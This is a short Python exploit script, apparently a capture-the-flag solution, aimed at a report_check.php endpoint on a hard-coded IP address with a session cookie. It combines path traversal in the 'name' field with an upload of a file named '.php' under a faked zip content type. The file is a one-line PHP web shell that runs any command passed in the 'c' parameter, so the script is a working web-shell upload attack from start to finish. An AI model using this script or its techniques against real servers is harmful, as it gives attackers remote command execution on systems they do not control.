import requests 

url = "http://52.231.230.112:8090"

s = requests.session() 
r = s.post(
    f"{url}/api/report_check.php",
    cookies={"PHPSESSID":"7fc2b8de800b11381d9bcd4dd4b0e62a"}, # remote
    data={ 
        'name': "../../var/www/html/helloworld2/",
        "content": "asdf"
    }, 
    files={
        "evidence": ('.php', "<?php system($_GET['c']); ?>", 'application/zip')
    },
    allow_redirects=False
)

print(r.status_code) 
